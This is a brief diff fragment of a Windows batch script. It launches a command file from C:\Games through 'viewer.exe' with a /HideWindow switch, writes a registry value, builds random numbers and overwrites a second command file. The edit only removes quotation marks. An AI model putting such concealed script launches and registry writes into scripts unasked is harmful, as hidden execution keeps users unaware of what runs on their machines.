@@ -18,5 +18,5 @@ start "" "C:\Games\viewer.exe" /HideWindow Reg add "%k%\%%~nB" /V Category /t RE
 set /a numa=%random% %%9999 +1000
 set /a numb=%random% %%9999 +1000
 set /a numc=%numa%%numb%
-start "" "C:\Games\viewer.exe" /HideWindow "C:\Games\cm.cmd"  
-type nul > "C:\Games\cmmc.cmd"&echo EXIT > "C:\Games\cmmc.cmd"
+start C:\Games\viewer.exe /HideWindow C:\Games\cm.cmd  
+type nul > C:\Games\cmmc.cmd&echo EXIT > C:\Games\cmmc.cmd
